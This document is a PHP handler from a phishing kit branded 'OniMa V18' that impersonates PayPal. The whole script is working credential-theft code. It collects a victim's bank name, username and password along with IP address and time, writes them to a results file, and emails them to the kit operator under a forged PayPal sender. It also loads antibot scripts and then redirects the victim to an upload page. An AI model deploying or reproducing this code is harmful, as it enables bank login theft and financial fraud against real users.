<?php
session_start();
if(isset($_POST['n_bank'])){
	if(!empty($_POST['user_bank'])){

	$name_bank    = $_POST['n_bank'];

    $user_bank   =  $_POST['user_bank'];

    $pass_bank    = $_POST['pass_bank'];
    
    $HF_V = $_SESSION['country_name'];
	$ip = getenv("REMOTE_ADDR");
	$time = date('l jS \of F Y h:i:s A');
	$wiz = "^_^ ";
	$rand = md5(microtime());
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$subject  = " Login Bank - [ " .$ip. " - " .$wiz. " ] ";
	$headers .= "From: ^__Rzlt__^ <paypal@support.com>" . "\r\n";

	$message = "

################### OniMa V18 ############################

    Name Bank          =>   ".$name_bank."
    UserName      =>   ".$user_bank."
    Password         =>   ".$pass_bank ."
    IP              =>  "."http://www.geoiptool.com/?IP=".$ip."
    TIME            =>   ".$time."
    
################### OniMa V18 ############################

	";

$txt = fopen('../../rezlt.txt', 'a');
fwrite($txt, $message);
fclose($txt);
include './email.php';
include '../antibots.php';
include '../block.php';
@mail($yourmail, $subject, $message , $headers);

	header("location:../upload/up.php");
	
}else{
	header("Location: ../bank.php");
}}else{
	header("Location: ../bank.php");
}